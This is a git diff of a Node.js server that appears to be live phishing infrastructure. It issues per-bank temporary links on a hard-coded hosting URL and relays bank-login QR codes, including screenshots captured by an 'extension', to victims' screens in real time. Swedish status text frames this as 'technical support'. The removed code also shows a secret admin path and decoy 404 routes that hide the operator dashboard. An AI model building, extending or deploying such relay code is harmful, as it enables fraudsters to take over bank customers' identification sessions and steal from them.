@@ -13,8 +13,6 @@ const io = require('socket.io')(http, {
 const path = require('path');
 const crypto = require('crypto');
 const config = require('./config');
-const Jimp = require('jimp');
-const QrCode = require('qrcode-reader');
 
 // Session storage for temporary URLs
 const temporaryUrls = new Map();
@@ -32,9 +30,7 @@ function createTemporaryUrl(bankId, expirationMinutes = 720) {
     temporaryUrls.set(token, {
         bankId,
         expiration,
-        qrData: null,
-        displayConnected: false,
-        lastStatus: 'waiting' // 'waiting' or 'qr_received'
+        qrData: null
     });
     
     return token;
@@ -56,13 +52,12 @@ setInterval(cleanExpiredUrls, 5 * 60 * 1000);
 // Enable JSON body parsing
 app.use(express.json({ limit: '2mb' }));
 
-// Add CORS middleware - allow extension requests
+// Add CORS middleware
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
-    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Origin, X-Requested-With, X-Session-ID, X-Source, Authorization');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Origin, X-Requested-With');
     res.header('Access-Control-Allow-Credentials', 'true');
-    res.header('Access-Control-Max-Age', '86400'); // 24 hours
     
     if (req.method === 'OPTIONS') {
         return res.sendStatus(200);
@@ -126,7 +121,7 @@ app.post('/api/generate-temp-url', (req, res) => {
     
     const token = createTemporaryUrl(bankId.toLowerCase(), expirationMinutes || 720);
     const bankName = bankDisplayNames[bankId.toLowerCase()].replace(/\s+/g, '');
-    const tempUrl = `${config.PRODUCTION_URL}/${bankName}/${token}`;
+    const tempUrl = `https://web-production-c116.up.railway.app/${bankName}/${token}`;
     
     res.json({
         url: tempUrl,
@@ -222,22 +217,14 @@ app.get('/Dragfelsokningskundidentifieringkund98721311', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'Dragfelsokningskundidentifieringkund98721311.html'));
 });
 
-// Secret admin path - hard to guess
-const SECRET_ADMIN_PATH = 'zeta-admin-7x9k2m4p8q1w3r5t6y-alpha-control';
-
-// Root route - show loading page (not dashboard)
+// Add a root route
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.redirect('/dashboard_98721311_control_panel.html');
 });
 
-// Secret admin route - only way to access dashboard
-app.get(`/${SECRET_ADMIN_PATH}`, (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'dashboard_control_secret.html'));
-});
-
-// Block direct access to dashboard routes - return 404
-app.get(['/dashboard_98721311_control_panel', '/dashboard_98721311_control_panel.html', '/admin', '/admin.html'], (req, res) => {
-    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
+// Handle dashboard route with and without .html
+app.get(['/dashboard_98721311_control_panel', '/dashboard_98721311_control_panel.html'], (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'dashboard_98721311_control_panel.html'));
 });
 
 // Add a health check endpoint
@@ -254,41 +241,10 @@ app.get('/api/qr', (req, res) => {
     res.status(200).json({ message: 'QR code endpoint is ready' });
 });
 
-// API endpoint to get status of a temporary URL
-app.get('/api/url-status/:token', (req, res) => {
-    const { token } = req.params;
-    const session = temporaryUrls.get(token);
-    
-    if (!session) {
-        return res.status(404).json({ error: 'URL not found' });
-    }
-    
-    if (session.expiration < Date.now()) {
-        temporaryUrls.delete(token);
-        return res.status(404).json({ error: 'URL expired' });
-    }
-    
-    // Determine status based on qrData and display connection
-    const status = session.qrData ? 'qr_received' : 'waiting';
-    const statusText = session.qrData ? 'QR kod mottagen' : 'Väntar på teknisk support';
-    
-    res.status(200).json({
-        token,
-        bankId: session.bankId,
-        status,
-        statusText,
-        hasQR: !!session.qrData,
-        displayConnected: session.displayConnected || false,
-        expiresAt: session.expiration
-    });
-});
-
 app.post('/api/qr', (req, res) => {
     console.log('Received QR code request from:', req.get('origin'));
-    console.log('Request headers:', req.headers);
-    const qrData = req.body.qrData || req.body.qrImageData; // Support both field names
+    const qrData = req.body.qrData;
     const sessionToken = req.body.sessionToken;
-    const qrString = req.body.qrString; // Extension may send this
 
     if (!qrData) {
         console.error('No QR data provided in request');
@@ -296,35 +252,19 @@ app.post('/api/qr', (req, res) => {
     }
 
     try {
-        // Validate base64 image data - accept data:image/ or just base64
-        if (!qrData.startsWith('data:image/') && !qrData.startsWith('/9j/') && !qrData.startsWith('iVBORw0KGgo')) {
-            // If it's not image data, check if it's a valid base64 string
-            if (typeof qrData === 'string' && qrData.length > 100) {
-                // Might be base64 without prefix, try to accept it
-                console.log('QR data without image prefix, accepting as base64');
-            } else {
-                console.error('Invalid image data format');
-                throw new Error('Invalid image data');
-            }
+        // Validate base64 image data
+        if (!qrData.startsWith('data:image/')) {
+            console.error('Invalid image data format');
+            throw new Error('Invalid image data');
         }
 
         // If session token is provided, store QR for that session
         if (sessionToken && temporaryUrls.has(sessionToken)) {
             console.log('Storing QR for session:', sessionToken);
-            const session = temporaryUrls.get(sessionToken);
-            session.qrData = qrData;
-            session.lastStatus = 'qr_received';
+            temporaryUrls.get(sessionToken).qrData = qrData;
         }
 
-        // Log extension metadata if provided
-        if (req.body.source) {
-            console.log('QR from extension source:', req.body.source);
-        }
-        if (req.headers['x-source']) {
-            console.log('QR from X-Source header:', req.headers['x-source']);
-        }
-
-        // Broadcast to all connected clients via Socket.IO
+        // Broadcast to all connected clients
         console.log('Broadcasting QR to', connectedDisplays.size, 'displays');
         io.emit('new_qr', qrData);
         
@@ -333,8 +273,7 @@ app.post('/api/qr', (req, res) => {
         
         res.status(200).json({ 
             message: 'QR code broadcast successful',
-            activeDisplays: Array.from(connectedDisplays),
-            timestamp: new Date().toISOString()
+            activeDisplays: Array.from(connectedDisplays)
         });
     } catch (error) {
         console.error('Error processing QR code:', error);
@@ -342,116 +281,25 @@ app.post('/api/qr', (req, res) => {
     }
 });
 
-// New endpoint: Decode QR code from screenshot
-app.post('/api/qr-decode', async (req, res) => {
-    console.log('📸 Received QR decode request from:', req.get('origin'));
-    const screenshot = req.body.screenshot;
-    
-    if (!screenshot) {
-        return res.status(400).json({ error: 'No screenshot provided' });
-    }
-    
-    // Always broadcast the image to displays, even if decoding fails
-    console.log('📡 Broadcasting QR image to', connectedDisplays.size, 'displays');
-    io.emit('new_qr', screenshot);
-    
-    try {
-        // Convert base64 image to buffer
-        const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
-        const imageBuffer = Buffer.from(base64Data, 'base64');
-        
-        console.log('🖼️ Image buffer size:', imageBuffer.length, 'bytes');
-        
-        // Load image with Jimp
-        const image = await Jimp.read(imageBuffer);
-        console.log('✅ Image loaded, dimensions:', image.bitmap.width, 'x', image.bitmap.height);
-        
-        // Create QR code reader
-        const qr = new QrCode();
-        
-        // Decode QR code
-        const qrData = await new Promise((resolve, reject) => {
-            qr.callback = (err, value) => {
-                if (err) {
-                    console.log('⚠️ QR decode error:', err.message);
-                    reject(err);
-                } else {
-                    resolve(value);
-                }
-            };
-            qr.decode(image.bitmap);
-        });
-        
-        if (qrData && qrData.result) {
-            console.log('✅ QR code decoded successfully:', qrData.result.substring(0, 50) + '...');
-            
-            res.status(200).json({
-                success: true,
-                qrData: screenshot, // Send back the image for display
-                qrString: qrData.result, // The decoded QR string
-                activeDisplays: Array.from(connectedDisplays),
-                timestamp: new Date().toISOString()
-            });
-        } else {
-            console.log('⚠️ QR decode returned no result');
-            res.status(200).json({
-                success: false,
-                message: 'No QR code found in image (but image was broadcast)',
-                qrData: screenshot, // Still send the image
-                activeDisplays: Array.from(connectedDisplays)
-            });
-        }
-    } catch (error) {
-        console.error('❌ Error decoding QR code:', error.message);
-        // Still return success since we broadcast the image
-        res.status(200).json({
-            success: true, // Changed to true since we broadcast the image
-            message: 'QR decode failed but image was broadcast: ' + error.message,
-            qrData: screenshot, // Send the image anyway
-            activeDisplays: Array.from(connectedDisplays),
-            timestamp: new Date().toISOString()
-        });
-    }
-});
-
 // Socket.IO connection handling
 io.on('connection', (socket) => {
     console.log('New connection:', socket.id);
 
-    socket.on('register_display', (data) => {
-        const displayId = typeof data === 'string' ? data : (data ? data.displayId : null);
-        const token = typeof data === 'object' && data ? data.token : null;
-        
-        console.log(`Display ${displayId || 'unknown'} registered${token ? ' with token ' + token : ''}`);
-        if (displayId) {
-            connectedDisplays.add(displayId);
-        }
-        
-        // If token is provided, mark that URL as having a connected display
-        if (token && temporaryUrls.has(token)) {
-            temporaryUrls.get(token).displayConnected = true;
-            console.log(`Token ${token} is now connected to display ${displayId || 'unknown'}`);
-        }
-        
-        socket.displayId = displayId;
-        socket.token = token;
-        
+    socket.on('register_display', (displayId) => {
+        console.log(`Display ${displayId} registered`);
+        connectedDisplays.add(displayId);
         io.emit('displays_updated', Array.from(connectedDisplays));
     });
 
     socket.on('disconnect', () => {
         console.log('Client disconnected:', socket.id);
         // Remove display from tracking
-        if (socket.displayId) {
-            connectedDisplays.delete(socket.displayId);
-        }
-        
-        // If this socket had a token, mark it as disconnected
-        if (socket.token && temporaryUrls.has(socket.token)) {
-            temporaryUrls.get(socket.token).displayConnected = false;
-        }
-        
-        io.emit('displays_updated', Array.from(connectedDisplays));
+        connectedDisplays.forEach(displayId => {
+            if (socket.displayId === displayId) {
+                connectedDisplays.delete(displayId);
+                io.emit('displays_updated', Array.from(connectedDisplays));
+            }
+        });
     });
 });
 
